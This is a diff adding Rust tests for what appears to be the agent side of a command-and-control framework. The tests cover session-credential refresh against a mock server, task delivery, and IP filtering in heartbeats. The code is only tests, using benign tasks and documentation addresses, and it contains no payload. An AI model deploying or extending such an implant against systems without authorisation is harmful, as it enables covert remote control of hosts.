+            listener.local_addr().expect("auth test server address")
+        );
+        let requests = Arc::new(Mutex::new(Vec::<String>::new()));
+        let captured = requests.clone();
+        let server = tokio::spawn(async move {
+            let responses = [
+                ("401 Unauthorized", ""),
+                ("401 Unauthorized", ""),
+                (
+                    "200 OK",
+                    concat!(
+                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.2."#,
+                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
+                    ),
+                ),
+                ("200 OK", ""),
+                ("401 Unauthorized", ""),
+                ("401 Unauthorized", ""),
+                (
+                    "200 OK",
+                    concat!(
+                        r#"{"session_credential":"s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.3."#,
+                        r#"Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"}"#
+                    ),
+                ),
+                ("200 OK", ""),
+            ];
+            for (status, body) in responses {
+                let (mut stream, _) = listener.accept().await.expect("accept auth request");
+                let request = read_http_request(&mut stream).await;
+                captured
+                    .lock()
+                    .unwrap_or_else(std::sync::PoisonError::into_inner)
+                    .push(request);
+                let response = format!(
+                    "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                    body.len()
+                );
+                stream
+                    .write_all(response.as_bytes())
+                    .await
+                    .expect("write auth response");
+            }
+        });
+
+        let state_dir = unique_auth_test_dir();
+        let config = AgentConfig {
+            server_url: server_addr.clone(),
+            listener_id: "listener-one".to_string(),
+            payload_id: "payload-one".to_string(),
+            enrollment_credential: SecretCredential::new_bootstrap(TEST_BOOTSTRAP_CREDENTIAL)
+                .expect("bootstrap credential"),
+            allow_insecure_isolated_lab: true,
+            ..Default::default()
+        };
+        let auth =
+            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("create auth state");
+        auth.persist_session(TEST_SESSION_ONE.to_string())
+            .expect("persist stale session");
+        let transport = HttpTaskTransport {
+            config: &config,
+            server_addr: &server_addr,
+            agent_id: "agent-one",
+            auth: &auth,
+        };
+        let outbox = TaskOutbox::default();
+        let task = sample_task("echo hello");
+        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
+        let executor = CountingExecutor::successful("hello\n");
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        server.await.expect("auth test server");
+
+        assert_eq!(executor.executions(), 1);
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::Delivered)
+        ));
+        let captured = requests
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        assert_eq!(captured.len(), 8);
+        assert_request_auth(&captured[0], TEST_SESSION_ONE);
+        assert!(captured[0].starts_with("POST /api/agent/agent-one/tasks/task-one/status HTTP/1.1"));
+        assert_request_auth(&captured[1], TEST_SESSION_ONE);
+        assert!(captured[1].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+        assert_request_auth(&captured[2], TEST_BOOTSTRAP_CREDENTIAL);
+        assert!(captured[2].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+        assert_request_auth(&captured[3], TEST_SESSION_TWO);
+        assert_eq!(http_body(&captured[0]), http_body(&captured[3]));
+        assert_request_auth(&captured[4], TEST_SESSION_TWO);
+        assert!(captured[4].starts_with("POST /api/agent/agent-one/results HTTP/1.1"));
+        assert_request_auth(&captured[5], TEST_SESSION_TWO);
+        assert!(captured[5].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+        assert_request_auth(&captured[6], TEST_BOOTSTRAP_CREDENTIAL);
+        assert!(captured[6].starts_with("POST /api/agent/agent-one/heartbeat HTTP/1.1"));
+        assert_request_auth(&captured[7], TEST_SESSION_THREE);
+        assert!(captured[7].starts_with("POST /api/agent/agent-one/results HTTP/1.1"));
+        assert_eq!(http_body(&captured[4]), http_body(&captured[7]));
+        drop(captured);
+
+        let restarted =
+            AgentAuth::from_dir(&config, "agent-one", &state_dir).expect("reload auth state");
+        let credential = restarted.active_credential().expect("reloaded credential");
+        assert_eq!(credential.source, CredentialSource::Session);
+        assert_eq!(credential.credential.expose(), TEST_SESSION_THREE);
+        let _ = fs::remove_dir_all(state_dir);
+    }
+
     #[test]
     fn heartbeat_payload_separates_agent_payload_and_listener_ids() {
         let config = AgentConfig {
@@ -2027,15 +2638,86 @@ mod tests {
             "agent-runtime-one",
             "linux".to_string(),
             "workstation".to_string(),
-            "127.0.0.1".to_string(),
-            vec!["127.0.0.1".to_string()],
+            vec!["192.0.2.10".to_string()],
             "203.0.113.10".to_string(),
         );
 
         assert_eq!(payload["id"], "agent-runtime-one");
         assert_eq!(payload["payload_id"], "payload-one");
         assert_eq!(payload["listener_id"], "listener-one");
+        assert_eq!(payload["ip"], "192.0.2.10");
+        assert_eq!(payload["ip_list"], json!(["192.0.2.10"]));
         assert_ne!(payload["id"], payload["payload_id"]);
+    }
+
+    #[test]
+    fn heartbeat_payload_filters_deduplicates_sorts_and_bounds_ip_fields() {
+        assert_eq!(
+            normalized_local_ips(vec![
+                "2001:db8::2".to_string(),
+                "192.0.2.2".to_string(),
+                "192.0.2.1".to_string(),
+                "192.0.2.2".to_string(),
+                "127.0.0.1".to_string(),
+                "224.0.0.1".to_string(),
+                "::1".to_string(),
+                "ff02::1".to_string(),
+                "not-an-address".to_string(),
+                "2001:0db8:0:0:0:0:0:1".to_string(),
+            ]),
+            vec![
+                "192.0.2.1".to_string(),
+                "192.0.2.2".to_string(),
+                "2001:db8::1".to_string(),
+                "2001:db8::2".to_string(),
+            ]
+        );
+
+        let config = AgentConfig {
+            payload_id: "payload-one".to_string(),
+            listener_id: "listener-one".to_string(),
+            ..Default::default()
+        };
+        let candidate_sets = [
+            (1..=40)
+                .map(|suffix| format!("10.0.0.{suffix}"))
+                .chain(std::iter::once("10.0.0.1".to_string()))
+                .collect::<Vec<_>>(),
+            (1..=40)
+                .map(|suffix| format!("2001:db8::{suffix:x}"))
+                .chain(std::iter::once("2001:db8::1".to_string()))
+                .collect::<Vec<_>>(),
+        ];
+
+        for candidates in candidate_sets {
+            let payload = build_heartbeat_payload(
+                &config,
+                "agent-runtime-one",
+                "linux".to_string(),
+                "workstation".to_string(),
+                candidates,
+                "203.0.113.10".to_string(),
+            );
+            let ip_list = payload["ip_list"].as_array().expect("IP list array");
+            assert_eq!(ip_list.len(), MAX_HEARTBEAT_IP_ENTRIES);
+
+            let parsed: Vec<IpAddr> = ip_list
+                .iter()
+                .map(|value| {
+                    value
+                        .as_str()
+                        .expect("IP string")
+                        .parse()
+                        .expect("canonical IP")
+                })
+                .collect();
+            assert!(parsed.windows(2).all(|pair| pair[0] < pair[1]));
+
+            let selected = payload["ip"].as_str().expect("selected IP");
+            assert_eq!(selected, ip_list[0].as_str().expect("first IP"));
+            assert!(!selected.contains(','));
+            assert!(selected.chars().count() <= MAX_HEARTBEAT_NETWORK_FIELD_CHARS);
+        }
     }
 
     fn sample_task(command: &str) -> Task {
@@ -2057,6 +2739,65 @@ mod tests {
             expires_at: Some("2026-07-23T16:35:00Z".to_string()),
             result: None,
         }
+    }
+
+    async fn read_http_request(stream: &mut tokio::net::TcpStream) -> String {
+        let mut request = Vec::new();
+        let mut buffer = [0_u8; 4096];
+        loop {
+            let read = stream.read(&mut buffer).await.expect("read auth request");
+            if read == 0 {
+                break;
+            }
+            request.extend_from_slice(&buffer[..read]);
+            if let Some(header_end) = find_header_end(&request) {
+                let headers = String::from_utf8_lossy(&request[..header_end]);
+                let content_length = headers
+                    .lines()
+                    .find_map(|line| {
+                        let (name, value) = line.split_once(':')?;
+                        name.eq_ignore_ascii_case("content-length")
+                            .then(|| value.trim().parse::<usize>().ok())
+                            .flatten()
+                    })
+                    .unwrap_or(0);
+                if request.len() >= header_end + 4 + content_length {
+                    break;
+                }
+            }
+        }
+        String::from_utf8(request).expect("UTF-8 auth request")
+    }
+
+    fn find_header_end(request: &[u8]) -> Option<usize> {
+        request.windows(4).position(|window| window == b"\r\n\r\n")
+    }
+
+    fn assert_request_auth(request: &str, credential: &str) {
+        let expected = format!("authorization: Bearer {credential}");
+        assert!(
+            request
+                .lines()
+                .any(|line| line.eq_ignore_ascii_case(&expected)),
+            "missing expected authorization header in request"
+        );
+    }
+
+    fn http_body(request: &str) -> &str {
+        request.split_once("\r\n\r\n").map_or("", |(_, body)| body)
+    }
+
+    fn unique_auth_test_dir() -> PathBuf {
+        static NEXT_DIRECTORY_ID: AtomicUsize = AtomicUsize::new(0);
+        let nanos = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .expect("system time")
+            .as_nanos();
+        let directory_id = NEXT_DIRECTORY_ID.fetch_add(1, Ordering::Relaxed);
+        env::temp_dir().join(format!(
+            "microc2-command-auth-{}-{nanos}-{directory_id}",
+            std::process::id(),
+        ))
     }
 
     fn fixed_now() -> DateTime<Utc> {
